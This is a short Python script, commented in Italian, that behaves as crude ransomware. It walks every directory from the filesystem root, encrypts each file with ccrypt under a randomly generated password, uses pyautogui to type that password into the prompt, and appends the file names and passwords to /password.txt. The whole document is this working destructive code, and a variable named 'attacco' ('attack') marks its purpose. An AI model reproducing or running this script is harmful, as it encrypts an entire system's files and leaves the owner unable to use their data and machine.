import os
import pyautogui as p
import time
import string
import random
import threading
from rich.console import Console
from rich.style import Style
console = Console()

base_style = Style.parse("red")
file_style = Style.parse('dark_slate_gray2')


os.system('clear')

os.system('pip install -r req.txt')



# percorso
percorso = '/'        # specified a path to crypt

def multpy():
    threading.Thread(target=cy).start()
    time.sleep(0.1)
    threading.Thread(target=insert).start()

#crypt
def insert():
        p.write(password)
        p.press('enter')
        p.write(password)
        p.press('enter')
        with open('/password.txt','a') as pwdfile:
            pwdfile.write('File Name: '+  file + '\nPassword File: ' +password+'\n\n')
def cy():
  os.system('ccrypt -e ' + attacco)


try:
    for (path,dirs,files) in os.walk(percorso,topdown=True):
        for file in files:
            if file != 'password.txt':
                #os.system('clear')

                lib = string.ascii_letters + string.digits + string.punctuation     # Generazione Password
                length = 30
                password = "".join(random.sample(lib,length))
                
                attacco = path + '/' + file
                multpy()
                console.print(f'File eseguito con successo: ',style = base_style)   # File Eseguito
                console.print(f"{file}", style= file_style)
                print()                                                            # Attivazione processo di crypting
                time.sleep(0.4)
                os.system('clear')
except:
    print('Non va ancora!')
